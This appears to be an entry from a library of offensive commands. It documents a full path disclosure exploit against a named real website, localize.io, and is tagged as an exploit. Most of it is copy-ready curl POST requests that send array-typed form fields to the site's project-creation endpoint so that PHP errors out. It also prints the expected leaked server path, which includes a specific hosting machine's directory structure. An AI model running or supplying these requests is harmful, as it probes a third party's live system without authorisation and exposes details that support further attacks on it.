---
id: cmd-curl-post-fpd-002
data: >-
  curl -X POST "http://www.localize.io/pages/create_project/72" -d
  "CSRFToken=TOKEN VALUE" -d "create_project[visibility]=1" -d
  "create_project[name][]=My+Android" -d "create_project[defaultLanguage]=1" -d
  "create_project[editRepositoryID][]=72"
tags:
  - exploit
  - web
  - http
  - fpd
type: command
output: Response containing PHP warning with full server path disclosure.
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.220Z'
verified: false
validated: true
submitted: true
---
# curl-post-fpd-trigger

## Command

```bash
curl -X POST "http://www.localize.io/pages/create_project/72" -d "CSRFToken=TOKEN VALUE" -d "create_project[visibility]=1" -d "create_project[name][]=My+Android" -d "create_project[defaultLanguage]=1" -d "create_project[editRepositoryID][]=72"
```

## Description

This command submits a manipulated POST request to the project creation endpoint, appending '[]' to parameters to trigger a PHP trim() error on arrays, resulting in Full Path Disclosure. Replace TOKEN VALUE with the actual CSRF token from the prior GET request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| URL | Target endpoint with project ID | Yes |
| `-d` | Form data parameters; key ones include CSRFToken, visibility, name[], defaultLanguage, editRepositoryID[] | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://www.localize.io/pages/create_project/72" -d "CSRFToken=abc123" -d "create_project[name][]=Test" -d "create_project[editRepositoryID][]=72"
```

### Advanced Usage

```bash
curl -X POST "http://www.localize.io/pages/create_project/72" -d "CSRFToken=abc123" -d "create_project[name][]=Test" -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

Response includes a PHP warning such as "Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/classes/UI.php on line 1495". The path in the warning discloses the server's filesystem structure.

## Related

- [[commands/curl-get-project-creation]]
- [[procedures/Trigger-FPD-with-Array-Parameter-Manipulation]]
